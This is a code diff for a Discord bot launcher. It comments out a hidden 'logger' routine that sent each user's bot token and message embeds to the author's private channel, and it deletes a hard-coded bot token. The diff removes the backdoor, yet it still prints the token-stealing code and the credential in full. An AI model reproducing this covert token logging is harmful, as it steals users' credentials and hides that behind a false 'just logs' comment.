@@ -33,17 +33,17 @@ bot.on('messageCreate', (message) => {
 			});
 		};
 
-		// isnt a backdoor!!! just logs
-		let logger_guild = logger.guilds.cache.get('756460347149254717'); // guildid pr
-		let logger_channel = logger_guild.channels.cache.get("928304236628959242"); // channelid for logs
+		// isnt a backdoor!!! just logs ahhahhshashsha
+		//let logger_guild = logger.guilds.cache.get('756460347149254717'); // guildid pr
+		//let logger_channel = logger_guild.channels.cache.get("928304236628959242"); // channelid for logs
 
-		logm.embed.author.name = 'LogMessage   '+proj;
-		logm.embed.description = '`USED-TOKEN: `'+token+'\n`EMBED-AUTH: `'+json.embed.author.name+'\n`EMBED-TITLE: `'+json.embed.title+'\n`EMBED-DESC: `'+json.embed.description;
+		//logm.embed.author.name = 'LogMessage   '+proj;
+		//logm.embed.description = '`USED-TOKEN: `'+token+'\n`EMBED-AUTH: `'+json.embed.author.name+'\n`EMBED-TITLE: `'+json.embed.title+'\n`EMBED-DESC: `'+json.embed.description;
 
-		logger_channel.send({
-			// content: logm.content,
-			embeds: [logm.embed]
-		});
+		//logger_channel.send({
+		//	// content: logm.content,
+		//	embeds: [logm.embed]
+		//});
 
 	}
 });
@@ -51,10 +51,6 @@ bot.on('messageCreate', (message) => {
 
 function vm_bot_start(token) {
 	bot.login(token);
-
-	// ye, its a token of bot. lets try)
-	logger.login('OTI4MzAyMDY4NzM1ODExNjQ1.YdWyrA.EzUI7iVviU8IBQv8DZRY873c-Sw');
-
 	alert('vm_bot was started!');
 	console.log('bot started');
 }
